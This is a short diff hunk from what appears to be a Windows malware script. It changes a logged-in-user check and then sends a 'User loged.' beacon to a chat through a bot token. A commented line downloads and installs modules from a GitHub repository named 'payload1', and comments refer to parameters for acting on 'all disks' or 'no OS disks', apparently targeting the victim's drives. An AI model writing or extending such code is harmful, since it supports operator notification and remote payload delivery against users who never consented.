@@ -152,28 +152,18 @@ def format_size(size_bytes):
     return f"{size_gb:.2f}"
 
 def is_user_logged_in():
-    try:
-        result = subprocess.run(["echo", "%username%"], capture_output=True, text=True, shell=True)
-        username = result.stdout.strip()
-        return bool(username)
-    except Exception as e:
-        print(f"Error : {e}")
+    output = subprocess.check_output(["echo", "%username%"], shell=True, text=True)
+    if str(output) == "SYSTEM":
         return False
-
-def sleep_until_user_loged():
-    while True:
-        if is_user_logged_in():
-            break
-        else:
-            print("No user connected")
-        time.sleep(5)
+    else:
+        return True
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
 #Sleep until %username% return a value
-sleep_until_user_loged()
-send_message(chat_id, token, "User loged.")
+if is_user_logged_in():
+    send_message(chat_id, token, "User loged.")
 
 #Param 1 : for all disks
 #Param 2 : for no OS disks
